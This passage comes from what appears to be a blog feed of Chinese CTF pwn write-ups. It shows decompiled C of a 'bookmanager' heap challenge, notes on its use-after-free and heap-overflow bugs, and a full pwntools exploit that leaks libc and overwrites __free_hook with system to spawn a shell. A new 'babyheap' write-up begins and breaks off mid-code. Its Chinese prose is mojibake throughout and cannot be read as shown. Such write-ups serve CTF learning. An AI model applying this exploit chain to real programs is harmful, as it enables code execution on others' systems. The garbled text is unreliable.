punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Chapter name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_34<span class="token punctuation">:</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNothing has been done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Section name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v4<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Text:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v7<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v6<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid!"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„æ˜¯Chapter/Section/Textæ¥åˆ¤æ–­æˆ‘ä»¬è¦æ›´æ–°å“ªéƒ¨åˆ†</p><p>è¿™ä¸ªåŠŸèƒ½å…¶å®æ²¡å•¥å¥½è®²çš„ï¼Œä¹Ÿå°±æ˜¯å„ç§éå†ï¼Œé€šè¿‡nameæ¥å®šä½chapter/section/textï¼Œç„¶åä¿®æ”¹å†…å®¹ã€‚</p><p>å¥½äº†ï¼Œåˆ°è¿™é‡Œå…«ä¸ªåŠŸèƒ½éƒ½åˆ†æå®Œäº†ï¼Œcè¯­è¨€çš„æŒ‡é’ˆçœŸæ˜¯çµé­‚ï¼Œä»ä¸€ä¸ªchunkæŒ‡å‘å¦ä¸€ä¸ªchunkï¼Œè¿˜å¯ä»¥ç»§ç»­æŒ‡å‘ä¸‹ä¸€ä¸ªchunkï¼Œä¿„ç½—æ–¯å¥—å¨ƒã€‚</p><p>é‚£ä¹ˆï¼Œç¨‹åºçš„æ¼æ´åœ¨å“ªï¼Œç¬¬ä¸€ä¸ªåœ¨remove_section()å‡½æ•°ä¸­ï¼Œfreeäº†sectionchunkåå¹¶æœªæ¸…é›¶ï¼Œç¬¬äºŒä¸ªåœ¨update()å‡½æ•°ä¸­ï¼Œåœ¨æ›´æ–°textåŠŸèƒ½ä¸­ï¼Œè¾“å…¥çš„sizeå›ºå®šä¸º255ï¼Œè¿™é‡Œå°±æœ‰å †æº¢å‡ºæ¼æ´ï¼Œæ•´ä¸ªç¨‹åºçš„åŠŸèƒ½ä¸€å¤§å †ï¼Œçœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†å®é™…ä¸Šåˆ©ç”¨èµ·æ¥å¾ˆç®€å•ï¼Œåªè¦ä»”ç»†åˆ†æç¨‹åºè¿™ä¸¤ä¸ªæ´ä¹Ÿå¹¶ä¸éš¾æ‰¾ã€‚</p><p>ä¸‹é¢æ”¾å‡ºexå¸ˆå‚…çš„exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./bookmanager'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25525)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_section</span><span class="token punctuation">(</span>chapter<span class="token punctuation">,</span> section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    section_ptr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    <span class="token keyword">return</span> section_ptr<span class="token keyword">def</span> <span class="token function">add_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"write:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_section</span><span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text):"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"New Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name of the book you want to create: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>add_chapter<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'cccc\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'here\n'</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\x78'</span><span class="token punctuation">)</span>preview<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Section:bbbb'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Text:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'dddd\n'</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\0'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token operator">+</span>            <span class="token string">'dddd'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'dddd\n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ä¿æŠ¤å…¨å¼€çš„å †é¢˜åˆ©ç”¨ç¬¬ä¸€æ­¥å°±æ˜¯å¾—å…ˆæ³„éœ²libcåœ°å€ï¼Œé€šè¿‡addtextï¼Œremovetextï¼Œaddtextï¼Œpreviewè¿™å››æ­¥å°±èƒ½æ³„éœ²å‡ºlibcåœ°å€</p><p>ç„¶åå†addä¸€ä¸ªsectionchunkï¼Œsectionnameä¸ºddddï¼Œè¿™ä¸ªsectionç´§æ¥ç€textccccï¼Œç„¶åupdate textccccï¼Œé€šè¿‡å †æº¢å‡ºï¼Œå°†sectiondddd+32çš„ä½ç½®å¤„å†™å…¥free_hookçš„åœ°å€ï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬ç¼–è¾‘sectionddddçš„textæ—¶ï¼Œå°±ç›¸å½“äºç¼–è¾‘free_hookï¼Œåªéœ€è¦å¾€å…¶ä¸­å†™å…¥systemï¼Œç„¶åremove textccccå³å¯getshell</p><p>ä»¥åè¿˜æ˜¯å¾—ä»”ç»†åˆ†æç¨‹åºï¼Œæ— è®ºæ˜¯è¿™ç§åŠŸèƒ½å¾ˆå¤šçš„å †é¢˜ï¼Œè¿˜æ˜¯vmpwnï¼Œåªè¦cè¯­è¨€åŸºç¡€è¶³å¤Ÿæ‰å®ï¼Œå°±ç®—åˆ†æå¾—æ…¢ï¼Œä¹Ÿè¿˜æ˜¯èƒ½æå®šçš„ã€‚</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå­¦ä¹ è®°å½•</title>
      <link href="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>è€ƒå¯Ÿç‚¹:unsortedbin attack,house of sprit,global_max_fast,fastbin attack</p><a id="more"></a><p>æŒ‰ç…§æµç¨‹ï¼Œé¦–å…ˆchecksec<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/1.jpg" alt=""><br>ä¿æŠ¤å…¨å¼€çš„å †é¢˜ï¼Œå¹¶ä¸”ç”±äºå¼€å¯äº†Full RELROï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½é€šè¿‡å¤å†™gotè¡¨æ¥getshell<br>è¿è¡Œä¸€ä¸‹ï¼Œçœ‹çœ‹ç¨‹åºå¦‚ä½•è¿è¡Œ<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/2.jpg" alt=""><br>èœå•é¢˜ï¼Œå¢åˆ æŸ¥æ”¹ä¸€æ ·ä¸å°‘ï¼Œç„¶åæˆ‘ä»¬æŠŠç¨‹åºæ‹–è¿›IDAçœ‹çœ‹<br>é¦–å…ˆæ˜¯mainå‡½æ•°</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span>__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp+0h]</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token 